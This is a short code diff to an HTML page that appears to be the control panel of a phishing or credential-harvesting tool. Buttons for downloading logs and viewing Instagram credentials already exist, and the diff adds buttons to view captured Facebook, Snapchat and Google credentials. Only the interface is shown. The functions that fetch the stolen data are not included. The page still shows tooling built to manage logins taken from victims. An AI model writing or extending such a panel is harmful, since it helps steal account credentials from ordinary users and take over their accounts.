@@ -49,6 +49,9 @@ else {
     <button class="btn btn-success m-2" id="btn-listen" onclick=saveTextAsFile(result.value,'log.txt')>Download Logs</button>
     <button class="btn btn-warning m-2" id="btn-clear">Clear Logs</button>
     <button class="btn btn-info m-2" id="btn-instagram" onclick=viewInstagramCredentials()>View Instagram Credentials</button>
+    <button class="btn btn-primary m-2" id="btn-facebook" onclick=viewFacebookCredentials()>View Facebook Credentials</button>
+    <button class="btn btn-warning m-2" id="btn-snapchat" onclick=viewSnapchatCredentials()>View Snapchat Credentials</button>
+    <button class="btn btn-danger m-2" id="btn-google" onclick=viewGoogleCredentials()>View Google Credentials</button>
 </div>
 
 
